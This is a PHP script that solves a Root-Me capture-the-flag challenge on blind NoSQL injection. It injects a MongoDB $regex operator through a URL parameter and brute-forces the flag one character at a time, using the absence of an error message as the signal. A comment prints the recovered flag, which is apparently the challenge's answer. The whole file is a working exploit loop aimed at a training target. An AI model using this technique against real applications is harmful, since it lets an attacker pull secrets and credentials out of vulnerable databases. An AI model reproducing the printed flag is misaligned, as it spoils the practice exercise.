<?php
$lowercase_letters = range('a', 'z');
$uppercase_letters = range('A', 'Z');
$numbers = range(0, 9);
$special_chars = array('!', '@', '%', '(', ')', '-', '_', '+', '=', '{', '}', ':', ';', ',', '/', '~', '`');

$all_chars = array_merge($lowercase_letters, $uppercase_letters, $numbers, $special_chars);

$url = 'http://challenge01.root-me.org/web-serveur/ch48/index.php?chall_name=nosqlblind&flag[$regex]=^';
$flag = "";
//flag 3@sY_n0_5q7_1nj3c710n
while(true) {
    $valid=false;
    foreach ($all_chars as $char){
        $response = file_get_contents($url.$flag.$char);
        if (!str_contains($response,"This is not a valid flag for the nosqlblind challenge...")){
            $flag.=$char;
            $valid=true;
            var_dump($flag);
            break;
        }
    }
    if ($valid == false){
        break;
    }
}
echo $flag;